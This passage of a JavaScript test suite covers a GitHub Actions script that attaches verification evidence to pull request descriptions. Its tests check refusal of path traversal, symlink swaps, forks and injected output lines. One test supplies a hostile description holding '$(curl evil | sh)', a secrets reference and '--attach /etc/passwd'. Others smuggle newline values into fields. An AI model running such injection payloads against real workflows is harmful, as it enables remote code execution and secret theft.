    const piece = Buffer.alloc(16 * 1024 * 1024);
    let pieces = 0;
    const pastTheCap = new ReadableStream({
      pull: controller => ((pieces += 1) <= 11 ? controller.enqueue(piece) : controller.close()),
    });
    await assert.rejects(download(github([artifact(1)], pastTheCap)), Refused);
    assert.ok(pieces <= 12, 'it stopped reading at the piece that passed the cap');
  });

  it('writes the validated files under WORK by the names it validated, and reports found', async () => {
    const work = workDir();
    const zipFile = path.join(path.dirname(work), 'evidence.zip');
    fs.writeFileSync(zipFile, bundle());
    const said = [];
    assert.equal(
      await fetchStep({ env: { ...ENV, WORK: work }, say: (kind, text) => said.push(`${kind}: ${text}`), zipFile }),
      true,
    );
    assert.deepEqual(fs.readdirSync(work).sort(), ['files', 'manifest.json']);
    assert.deepEqual(fs.readdirSync(path.join(work, 'files')).sort(), ['profile.png', 'video.mp4']);
    assert.deepEqual(fs.readFileSync(path.join(work, 'files', 'video.mp4')), MP4);
    assert.deepEqual(said, [
      'notice: Run 37731397352 handed off the evidence of verify run r20261008-052713-253e for pull request #669: 2 files.',
    ]);
  });

  it('writes only into a directory that is new or empty', async () => {
    const work = workDir();
    fs.mkdirSync(work);
    fs.writeFileSync(path.join(work, 'left-by-something-else'), 'x');
    const zipFile = path.join(path.dirname(work), 'evidence.zip');
    fs.writeFileSync(zipFile, bundle());
    await assert.rejects(
      fetchStep({ env: { ...ENV, WORK: work }, say: () => undefined, zipFile }),
      /WORK must be a new or empty directory/,
    );
    assert.deepEqual(fs.readdirSync(work), ['left-by-something-else']);
  });

  it('writes nothing for an archive it refuses', async () => {
    const work = workDir();
    const zipFile = path.join(path.dirname(work), 'evidence.zip');
    fs.writeFileSync(zipFile, bundle(GOOD, MEDIA, [{ name: '../escaped.png', data: PNG }]));
    await assert.rejects(fetchStep({ env: { ...ENV, WORK: work }, say: () => undefined, zipFile }), Refused);
    assert.deepEqual(fs.readdirSync(path.dirname(work)), ['evidence.zip']);
  });

  it('reads no artifact of a run that is not a dispatched session of this repository', async () => {
    const hub = github([artifact(1)]);
    const said = [];
    for (const change of [
      { RUN_EVENT: 'pull_request' },
      { RUN_PATH: '.github/workflows/ci.yml' },
      { RUN_HEAD_REPO: 'someone/clerk-ios' },
    ]) {
      assert.equal(
        await fetchStep({
          env: { ...ENV, ...change, WORK: workDir() },
          say: (_kind, text) => said.push(text),
          fetch: hub.fetch,
        }),
        false,
      );
    }
    assert.deepEqual(hub.calls, []);
    assert.equal(said.length, 3);
  });
});

describe('the step that edits the description', () => {
  const PULL = {
    state: 'open',
    body: '## Summary\r\n\r\nFixes the button.\r\n',
    head: { ref: 'feature/change', sha: COMMIT, repo: { full_name: REPO } },
    base: { repo: { full_name: REPO } },
  };

  async function fetched(manifest = GOOD, media = MEDIA) {
    const work = workDir();
    const zipFile = path.join(path.dirname(work), 'evidence.zip');
    fs.writeFileSync(zipFile, bundle(manifest, media));
    await fetchStep({ env: { ...ENV, WORK: work }, say: () => undefined, zipFile });
    return { ...ENV, WORK: work };
  }

  function fakeGh(pull = PULL, onRead = () => undefined, commits = COMMITS) {
    const state = { pull: structuredClone(pull), reads: 0, calls: [], writtenBody: null };
    const gh = (args, options) => {
      state.calls.push({ args, cwd: options.cwd });
      const page = /\/commits\?per_page=100&page=(\d+)$/.exec(args[1] ?? '');
      if (args[0] === 'api' && page !== null) {
        const from = (Number(page[1]) - 1) * 100;
        fs.writeFileSync(options.stdoutFile, JSON.stringify(commits.slice(from, from + 100)));
        return { status: 0, stderr: '' };
      }
      if (args[0] === 'api') {
        state.reads += 1;
        onRead(state);
        fs.writeFileSync(options.stdoutFile, JSON.stringify(state.pull));
        return { status: 0, stderr: '' };
      }
      state.writtenBody = fs.readFileSync(args[args.indexOf('--body-file') + 1], 'utf8');
      return { status: 0, stderr: '' };
    };
    return { gh, state };
  }

  const publish = (env, fake, options = {}) => {
    const said = [];
    const outcome = publishStep({
      env,
      say: (kind, text) => said.push(`${kind}: ${text}`),
      gh: fake.gh,
      nonce: () => 'n0nce',
      ...options,
    });
    return { outcome, said };
  };
  const onDisk = manifest => file => `evidence-n0nce-${manifest.files.indexOf(file) + 1}${path.extname(file.name)}`;
  const PLACED = blockOf(GOOD, onDisk(GOOD));
  const COMMITS = [{ sha: 'a'.repeat(40) }, { sha: COMMIT }];

  it('adds the block after the description and attaches the files from their own directory, under names the description could not have guessed', async () => {
    const env = await fetched();
    const fake = fakeGh();
    const { outcome, said } = publish(env, fake);
    assert.equal(outcome, 'published');
    assert.deepEqual(
      fake.state.calls.map(call => call.args.slice(0, 2).join(' ')),
      [
        'api repos/clerk/clerk-ios/pulls/669',
        'api repos/clerk/clerk-ios/pulls/669/commits?per_page=100&page=1',
        'api repos/clerk/clerk-ios/pulls/669',
        'pr edit',
      ],
    );
    const edit = fake.state.calls[3];
    assert.deepEqual(edit.args, [
      'pr',
      'edit',
      '669',
      '--repo',
      REPO,
      '--body-file',
      path.join(env.WORK, 'body.md'),
      '--attach',
      './evidence-n0nce-1.mp4',
      '--attach',
      './evidence-n0nce-2.png',
    ]);
    assert.equal(edit.cwd, path.join(env.WORK, 'files'));
    assert.deepEqual(fs.readdirSync(edit.cwd).sort(), ['evidence-n0nce-1.mp4', 'evidence-n0nce-2.png']);
    assert.equal(fake.state.writtenBody, `${PULL.body}\r\n${PLACED.replaceAll('\n', '\r\n')}`);
    assert.ok(
      PLACED.includes('![video.mp4](./evidence-n0nce-1.mp4)') && PLACED.includes('![profile](./evidence-n0nce-2.png)'),
    );
    assert.deepEqual(said, [
      'notice: Put verify run r20261008-052713-253e in the description of pull request #669: 2 files.',
    ]);
  });

  it('replaces the block of an earlier run and keeps the text around it', async () => {
    const env = await fetched();
    const earlier = blockOf(manifestFor(MEDIA, { run: 'r20261007-010101-aaaa' }));
    const fake = fakeGh({ ...PULL, body: `intro\r\n\r\n${earlier}\r\n\r\noutro` });
    assert.equal(publish(env, fake).outcome, 'published');
    assert.equal(fake.state.writtenBody, `intro\r\n\r\n${PLACED.replaceAll('\n', '\r\n')}\r\n\r\noutro`);
  });

  it('names no file the way a description can name one, so gh rewrites no reference outside the block', async () => {
    const attachedBy = async () => {
      const fake = fakeGh({
        ...PULL,
        body: 'Before: ![demo](./video.mp4) and [shot](./profile.png)\n\n[x]: ./video.mp4\n',
      });
      publishStep({ env: await fetched(), say: () => undefined, gh: fake.gh });
      return fake.state.calls[3].args.filter((_, i, args) => args[i - 1] === '--attach');
    };
    const first = await attachedBy();
    const second = await attachedBy();
    for (const name of [...first, ...second]) {
      assert.match(name, /^\.\/evidence-[0-9a-f]{16}-[12]\.(mp4|png)$/);
    }
    assert.notDeepEqual(first, second, 'the names differ from one publish to the next');
  });

  it('keeps the description out of every command line, even when it holds shell and workflow syntax', async () => {
    const env = await fetched();
    const hostile = '$(curl evil | sh) `id` ${{ secrets.VERIFY_EVIDENCE_TOKEN }}\n::add-mask::x\n--attach /etc/passwd';
    const fake = fakeGh({ ...PULL, body: hostile });
    const { said } = publish(env, fake);
    for (const call of fake.state.calls) {
      for (const arg of call.args) {
        assert.equal(arg.includes('evil') || arg.includes('passwd'), false, arg);
      }
    }
    assert.ok(fake.state.writtenBody.startsWith(`${hostile}\n\n<!-- verify-evidence:ios -->`));
    assert.equal(said.join('\n').includes('evil'), false);
  });

  it('prints the command and runs nothing in a dry run', async () => {
    const env = await fetched();
    const pullFile = path.join(path.dirname(env.WORK), 'pull.json');
    const commitsFile = path.join(path.dirname(env.WORK), 'commits.json');
    fs.writeFileSync(pullFile, JSON.stringify(PULL));
    fs.writeFileSync(commitsFile, JSON.stringify(COMMITS));
    const fake = fakeGh();
    const { outcome, said } = publish(env, fake, { dryRun: true, pullFile, commitsFile });
    assert.equal(outcome, 'dry run');
    assert.deepEqual(fake.state.calls, []);
    assert.deepEqual(said, [
      `plain: would run, in ${path.join(env.WORK, 'files')}:\ngh pr edit 669 --repo clerk/clerk-ios --body-file ${path.join(env.WORK, 'body.md')} --attach ./evidence-n0nce-1.mp4 --attach ./evidence-n0nce-2.png`,
    ]);
    assert.equal(
      fs.readFileSync(path.join(env.WORK, 'body.md'), 'utf8'),
      `${PULL.body}\r\n${PLACED.replaceAll('\n', '\r\n')}`,
    );
  });

  it('names the person the workflow says started the session, and publishes nothing under a name that is not a login', async () => {
    const fake = fakeGh();
    publish({ ...(await fetched()), RUN_ACTOR: 'hubot-9[bot]' }, fake);
    assert.match(fake.state.writtenBody, /\/actions\/runs\/37731397352\) that `hubot-9\[bot\]` started: 3 of 3 passed/);
    for (const name of [undefined, '', 'mallory` [approved](https://example.com) `', 'a\nb', 'a b']) {
      const refusing = fakeGh();
      const env = { ...(await fetched()), RUN_ACTOR: name };
      assert.throws(() => publish(env, refusing), Refused, JSON.stringify(name));
      assert.deepEqual(refusing.state.calls, []);
    }
  });

  const STARTED_ON = 'd'.repeat(40);
  const startedEarlier = async () => ({ ...(await fetched()), HEAD_SHA: STARTED_ON });

  it('publishes a run made at the head of the pull request when the session started on an earlier commit of it', async () => {
    const fake = fakeGh(PULL, undefined, [{ sha: STARTED_ON }, { sha: 'e'.repeat(40) }, { sha: COMMIT }]);
    const { outcome } = publish(await startedEarlier(), fake);
    assert.equal(outcome, 'published');
    assert.ok(fake.state.writtenBody.includes('r20261008-052713-253e'));
    assert.equal(fake.state.writtenBody.includes('newer commits'), false);
  });

  it('publishes a run made at an earlier commit of the pull request, and says that the pull request has newer commits', async () => {
    const NEWER = 'b'.repeat(40);
    const fake = fakeGh({ ...PULL, head: { ...PULL.head, sha: NEWER } }, undefined, [{ sha: COMMIT }, { sha: NEWER }]);
    const { outcome } = publish(await fetched(), fake);
    assert.equal(outcome, 'published');
    assert.match(fake.state.writtenBody, / at `0f50b597b1c2`\. The pull request has newer commits\.\r\n/);
  });

  it('says that the pull request has newer commits when its head moves while the evidence is being placed', async () => {
    const NEWER = 'b'.repeat(40);
    const fake = fakeGh(
      PULL,
      state => void (state.reads === 2 && ((state.pull.head.sha = NEWER), (state.pull.body = 'Edited.\n'))),
      [{ sha: COMMIT }, { sha: NEWER }],
    );
    assert.equal(publish(await fetched(), fake).outcome, 'published');
    assert.match(
      fake.state.writtenBody,
      /^Edited\.\n\n<!-- verify-evidence:ios -->\n\nverify run .* newer commits\.\n/,
    );
  });

  it('says that the pull request has newer commits when only its head moves between the read and the write', async () => {
    const NEWER = 'b'.repeat(40);
    const fake = fakeGh(PULL, state => void (state.reads === 2 && (state.pull.head.sha = NEWER)), [
      { sha: COMMIT },
      { sha: NEWER },
    ]);
    assert.equal(publish(await fetched(), fake).outcome, 'published');
    assert.equal(fake.state.reads, 3);
    assert.match(fake.state.writtenBody, / at `0f50b597b1c2`\. The pull request has newer commits\.\r\n/);
  });

  it('adds that the pull request has newer commits to a run it already published, and uploads nothing again', async () => {
    const NEWER = 'b'.repeat(40);
    const uploaded = blockOf(GOOD).replaceAll('./', 'https://github.com/user-attachments/assets/');
    const moved = {
      ...PULL,
      body: `intro\r\n\r\n${uploaded.replaceAll('\n', '\r\n')}\r\noutro`,
      head: { ...PULL.head, sha: NEWER },
    };
    const fake = fakeGh(moved, undefined, [{ sha: COMMIT }, { sha: NEWER }]);
    const { outcome, said } = publish(await fetched(), fake);
    assert.equal(outcome, 'noted');
    assert.equal(
      fake.state.writtenBody,
      moved.body.replace('at `0f50b597b1c2`.', 'at `0f50b597b1c2`. The pull request has newer commits.'),
    );
    assert.equal(fake.state.calls.at(-1).args.includes('--attach'), false);
    assert.deepEqual(said, [
      'notice: Noted in the description of pull request #669 that it has newer commits than verify run r20261008-052713-253e.',
    ]);
    const noted = fakeGh({ ...moved, body: fake.state.writtenBody }, undefined, [{ sha: COMMIT }, { sha: NEWER }]);
    assert.equal(publish(await fetched(), noted).outcome, 'already there');
    assert.equal(noted.state.writtenBody, null);
  });

  it('replaces a block that names the same verify run under another session, and adds no note to it', async () => {
    const NEWER = 'b'.repeat(40);
    const otherSession = evidenceBlock(GOOD, { ...SESSION, runId: '11111111111', actor: 'mallory' }).replaceAll(
      './',
      'https://github.com/user-attachments/assets/',
    );
    for (const head of [COMMIT, NEWER]) {
      const pull = { ...PULL, body: `intro\n\n${otherSession}\n`, head: { ...PULL.head, sha: head } };
      const fake = fakeGh(pull, undefined, [{ sha: COMMIT }, { sha: NEWER }]);
      const { outcome } = publish(await fetched(), fake);
      assert.equal(outcome, 'published', head);
      assert.equal(fake.state.writtenBody.includes('/actions/runs/11111111111)'), false, head);
      assert.equal(fake.state.writtenBody.includes('mallory'), false, head);
      assert.match(
        fake.state.writtenBody,
        /\/actions\/runs\/37731397352\) that `octocat` started: 3 of 3 passed/,
        head,
      );
      assert.equal(fake.state.calls.at(-1).args.includes('--attach'), true, head);
    }
  });

  it('says that GitHub lists only the first 250 commits when a longer pull request does not show the commits of the run', async () => {
    const listed = Array.from({ length: 250 }, (_, i) => ({ sha: i.toString(16).padStart(40, '0') }));
    const long = { ...PULL, commits: 300 };
    const fake = fakeGh(long, undefined, listed);
    const { outcome, said } = publish(await fetched(), fake);
    assert.equal(outcome, 'refused');
    assert.equal(fake.state.writtenBody, null);
    assert.deepEqual(said, [
      'notice: Pull request #669 has 300 commits and GitHub lists only the first 250, which do not hold the commit the session started on, so run 37731397352 cannot be checked against it and nothing is published.',
    ]);
    const early = fakeGh(long, undefined, [{ sha: COMMIT }, ...listed.slice(1)]);
    assert.equal(publish(await fetched(), early).outcome, 'published', 'both commits are among the first 250');
    const short = fakeGh({ ...PULL, commits: 250 }, undefined, listed);
    assert.match(
      publish(await fetched(), short).said[0],
      /is not the pull request of run 37731397352 \(the commit the session started on is not one of its commits\)/,
    );
  });

  it('publishes nothing when the commit the verify run was made at is not a commit of the pull request', async () => {
    const fake = fakeGh(PULL, undefined, [{ sha: 'e'.repeat(40) }]);
    const { outcome, said } = publish(await fetched(manifestFor(MEDIA, { commit: 'c'.repeat(40) })), fake);
    assert.equal(outcome, 'refused');
    assert.equal(fake.state.writtenBody, null);
    assert.deepEqual(said, [
      'notice: Pull request #669 is not the pull request of run 37731397352 (the commit the session started on is not one of its commits), so nothing is published.',
    ]);
    const other = fakeGh(PULL, undefined, [{ sha: COMMIT }]);
    const refused = publish(await fetched(manifestFor(MEDIA, { commit: 'c'.repeat(40) })), other);
    assert.deepEqual(refused.said, [
      'notice: Pull request #669 is not the pull request of run 37731397352 (the commit the verify run was made at is not one of its commits), so nothing is published.',
    ]);
    assert.equal(other.state.writtenBody, null);
  });

  it('publishes nothing when the commit the session started on is not a commit of the pull request', async () => {
    const fake = fakeGh(PULL, undefined, [{ sha: 'e'.repeat(40) }, { sha: COMMIT }]);
    const { outcome, said } = publish(await startedEarlier(), fake);
    assert.equal(outcome, 'refused');
    assert.equal(fake.state.writtenBody, null);
    assert.deepEqual(said, [
      'notice: Pull request #669 is not the pull request of run 37731397352 (the commit the session started on is not one of its commits), so nothing is published.',
    ]);
  });

  it('reads every page of the commits GitHub lists, and stops at the last one', async () => {
    const many = Array.from({ length: 230 }, (_, i) => ({ sha: i.toString(16).padStart(40, '0') }));
    const pagesRead = fake => fake.state.calls.filter(call => /\/commits\?/.test(call.args[1] ?? '')).length;
    const found = fakeGh(PULL, undefined, [...many, { sha: STARTED_ON }, { sha: COMMIT }]);
    assert.equal(publish(await startedEarlier(), found).outcome, 'published');
    assert.equal(pagesRead(found), 3);
    const absent = fakeGh(PULL, undefined, [...many, ...many, { sha: COMMIT }]);
    assert.equal(publish(await startedEarlier(), absent).outcome, 'refused');
    assert.equal(pagesRead(absent), 3);
    const short = fakeGh();
    publish(await fetched(), short);
    assert.equal(pagesRead(short), 1);
  });

  it('fails when the list of commits cannot be read, and writes nothing', async () => {
    const fake = fakeGh();
    const failing = {
      gh: (args, options) =>
        /\/commits\?/.test(args[1] ?? '') ? { status: 1, stderr: 'HTTP 502\n' } : fake.gh(args, options),
    };
    const env = await fetched();
    assert.throws(() => publish(env, failing), /gh could not read the commits of pull request #669\ngh: HTTP 502/);
    assert.equal(fake.state.writtenBody, null);
  });

  const refusedPulls = [
    { what: 'a closed pull request', change: { state: 'closed' }, why: 'it is not open' },
    {
      what: 'a pull request from a fork',
      change: { head: { ...PULL.head, repo: { full_name: 'someone/clerk-ios' } } },
      why: 'its branch is in another repository',
    },
    {
      what: 'a pull request of another branch',
      change: { head: { ...PULL.head, ref: 'someone-elses-branch' } },
      why: 'its branch is not the branch the session ran on',
    },
  ];
  for (const { what, change, why } of refusedPulls) {
    it(`publishes nothing to ${what}`, async () => {
      const fake = fakeGh({ ...PULL, ...change });
      const { outcome, said } = publish(await fetched(), fake);
      assert.equal(outcome, 'refused');
      assert.equal(
        fake.state.calls.some(call => call.args[0] === 'pr'),
        false,
      );
      assert.deepEqual(said, [
        `notice: Pull request #669 is not the pull request of run 37731397352 (${why}), so nothing is published.`,
      ]);
    });
  }

  it('publishes nothing when the pull request closes between the first read and the write', async () => {
    const fake = fakeGh(PULL, state => void (state.reads === 2 && (state.pull.state = 'closed')));
    const { outcome } = publish(await fetched(), fake);
    assert.equal(outcome, 'refused');
    assert.equal(fake.state.writtenBody, null);
  });

  it('does not upload a run that the description already holds', async () => {
    const fake = fakeGh({
      ...PULL,
      body: `intro\n\n${blockOf(GOOD).replaceAll('./', 'https://github.com/user-attachments/assets/')}\n`,
    });
    const { outcome, said } = publish(await fetched(), fake);
    assert.equal(outcome, 'already there');
    assert.equal(fake.state.writtenBody, null);
    assert.deepEqual(said, [
      'notice: The description of pull request #669 already holds verify run r20261008-052713-253e.',
    ]);
  });

  it('uploads a run again when an earlier upload left a file reference that was never rewritten', async () => {
    const halfUploaded = blockOf(GOOD).replace('./video.mp4', 'https://github.com/user-attachments/assets/1');
    const fake = fakeGh({ ...PULL, body: `intro\n\n${halfUploaded}\n` });
    assert.equal(publish(await fetched(), fake).outcome, 'published');
    assert.equal(fake.state.writtenBody, `intro\n\n${PLACED}\n`);
  });

  it('builds on the newer description when someone edits it between the read and the write', async () => {
    const fake = fakeGh(PULL, state => void (state.reads === 2 && (state.pull.body = 'Rewritten by a reviewer.\n')));
    assert.equal(publish(await fetched(), fake).outcome, 'published');
    assert.equal(fake.state.reads, 3);
    assert.equal(fake.state.writtenBody, `Rewritten by a reviewer.\n\n${PLACED}`);
  });

  it('writes nothing when the description changes twice, and says so', async () => {
    const fake = fakeGh(PULL, state => void (state.pull.body = `edit ${state.reads}\n`));
    const env = await fetched();
    assert.throws(
      () => publish(env, fake),
      /changed twice while the evidence was being placed, so nothing was written/,
    );
    assert.equal(fake.state.writtenBody, null);
  });

  it('writes nothing to a description whose markers are broken, and says which', async () => {
    const fake = fakeGh({ ...PULL, body: 'text\n<!-- verify-evidence:ios -->\nthe end marker was deleted\n' });
    const env = await fetched();
    assert.throws(
      () => publish(env, fake),
      /has the start marker 1 times and the end marker 0 times, so the evidence has no one place to go/,
    );
    assert.equal(fake.state.writtenBody, null);
  });

  it('writes nothing over text between two markers that is not an evidence block', async () => {
    const fake = fakeGh({
      ...PULL,
      body: '<!-- verify-evidence:ios -->\nreviewer notes\n<!-- /verify-evidence:ios -->\n',
    });
    const env = await fetched();
    assert.throws(() => publish(env, fake), /has text between the markers that is not an evidence block/);
    assert.equal(fake.state.writtenBody, null);
  });

  it('refuses files that changed after the first step wrote them', async () => {
    const env = await fetched();
    fs.rmSync(path.join(env.WORK, 'files', 'profile.png'));
    fs.symlinkSync('/etc/passwd', path.join(env.WORK, 'files', 'profile.png'));
    assert.throws(() => publish(env, fakeGh()), Refused);
  });

  it('fails with what gh said, one prefixed line each, when gh fails', async () => {
    const env = await fetched();
    const fake = fakeGh();
    const failing = {
      gh: (args, options) =>
        args[0] === 'pr'
          ? { status: 1, stderr: '::error::from gh\nunsupported authentication type\n' }
          : fake.gh(args, options),
    };
    assert.throws(
      () => publish(env, failing),
      error =>
        error.message ===
        'gh pr edit failed for pull request #669\ngh: ::error::from gh\ngh: unsupported authentication type',
    );
  });
});

describe('what the workflow can be told by the script', () => {
  it('writes each message as one workflow command, whatever the text holds', () => {
    assert.equal(
      workflowCommand('error', 'gh pr edit failed\ngh: ::add-mask::x\r\n100%'),
      '::error title=verify-attach::gh pr edit failed%0Agh: ::add-mask::x%0D%0A100%25',
    );
  });

  it('writes only found=true or found=false to the step outputs', async () => {
    const work = workDir();
    const outputs = path.join(path.dirname(work), 'outputs');
    const good = path.join(path.dirname(work), 'good.zip');
    const hostile = path.join(path.dirname(work), 'hostile.zip');
    fs.writeFileSync(good, bundle());
    fs.writeFileSync(hostile, bundle(manifestFor(MEDIA, { device: 'x\nfound=true\nGITHUB_ENV=1' })));
    fs.writeFileSync(outputs, '');
    const lines = [];
    assert.equal(
      await main(['fetch', '--zip', hostile], { ...ENV, WORK: work, GITHUB_OUTPUT: outputs }, line => lines.push(line)),
      1,
    );
    assert.equal(fs.readFileSync(outputs, 'utf8'), '');
    assert.deepEqual(lines, [
      '::error title=verify-attach::The evidence was refused: device is missing or malformed. Nothing is published.',
    ]);
    assert.equal(
      await main(['fetch', '--zip', good], { ...ENV, WORK: work, GITHUB_OUTPUT: outputs }, () => undefined),
      0,
    );
    assert.equal(
      await main(
        ['fetch', '--zip', good],
        { ...ENV, RUN_EVENT: 'pull_request', WORK: workDir(), GITHUB_OUTPUT: outputs },
        () => undefined,
      ),
      0,
    );
    assert.equal(fs.readFileSync(outputs, 'utf8'), 'found=true\nfound=false\n');
  });
});

describe('the workflow', () => {
  const here = path.dirname(fileURLToPath(import.meta.url));
  const file = [path.join(here, '..', 'workflows'), path.join(here, '..', '.github', 'workflows')]
    .map(dir => path.join(dir, 'verify-attach.yml'))
    .find(candidate => fs.existsSync(candidate));
  const workflow = fs.readFileSync(file, 'utf8');
  const steps = workflow
    .slice(workflow.indexOf('    steps:\n'))
    .split(/\n(?= {6}- )/)
    .slice(1);

  it('gives the bot token to the one step that edits the description, and to nothing else', () => {
    const holders = steps.filter(step => step.includes('secrets.'));
    assert.equal(holders.length, 1);
    assert.match(holders[0], /^ {10}GH_TOKEN: \$\{\{ secrets\.VERIFY_EVIDENCE_TOKEN \}\}$/m);
    assert.match(holders[0], /^ {8}run: node \S*verify-attach\.mjs publish$/m);
    assert.deepEqual(workflow.match(/secrets\.[A-Z_]+[^\n]*/g), [
      "secrets.VERIFY_EVIDENCE_TOKEN != '' }}",
      'secrets.VERIFY_EVIDENCE_TOKEN }}',
    ]);
  });

  it('holds the bot token in a job of the verify-evidence environment, which a branch workflow cannot enter', () => {
    const jobs = workflow
      .slice(workflow.indexOf('\njobs:\n') + '\njobs:\n'.length)
      .split(/\n(?= {2}[A-Za-z0-9_-]+:\n)/);
    const holders = jobs.filter(job => job.includes('secrets.'));
    assert.equal(holders.length, 1);
    assert.match(holders[0], /^ {4}environment: verify-evidence$/m);
    assert.equal(/^env:/m.test(workflow), false, 'no secret can sit in the env of the whole workflow');
  });

  it('takes the name of who started the session from the run GitHub records, not from the session', () => {
    assert.match(workflow, /^ {6}RUN_ACTOR: \$\{\{ github\.event\.workflow_run\.actor\.login \}\}$/m);
    assert.equal(workflow.match(/RUN_ACTOR/g).length, 1);
  });

  it('makes the runs for one branch take turns at the description, and cancels none that has started', () => {
    assert.match(
      workflow,
      /^ {4}concurrency:\n {6}group: verify-attach-\$\{\{ github\.event\.workflow_run\.head_repository\.full_name \}\}-\$\{\{ github\.event\.workflow_run\.head_branch \}\}\n {6}cancel-in-progress: false\n/m,
    );
  });

  it('interpolates nothing into a script, and runs only the script of the commit GitHub chose', () => {
    for (const step of steps) {
      const run = /^ {8}run: (?:\|\n((?: {10}.*\n?)+)|(.*))$/m.exec(step);
      if (run !== null) {
        assert.equal((run[1] ?? run[2]).includes('${{'), false, step);
      }
    }
    assert.match(workflow, /^ {10}ref: \$\{\{ github\.sha \}\}$/m);
    assert.equal(workflow.includes('download-artifact'), false);
    assert.equal(/\b(npm|pnpm|yarn|npx) /.test(workflow), false);
    assert.match(workflow, /^permissions:\n {2}actions: read\n {2}contents: read\n\n/m);
    assert.equal(/: write\b/.test(workflow), false);
  });

  it('starts only for a dispatched session of this repository', () => {
    assert.match(workflow, /^ {6}- verify-remote$/m);
    for (const condition of [
      "github.event.workflow_run.event == 'workflow_dispatch'",
      "github.event.workflow_run.path == '.github/workflows/verify-remote.yml'",
      'github.event.workflow_run.head_repository.full_name == github.repository',
    ]) {
      assert.ok(workflow.includes(condition), condition);
    }
  });
});
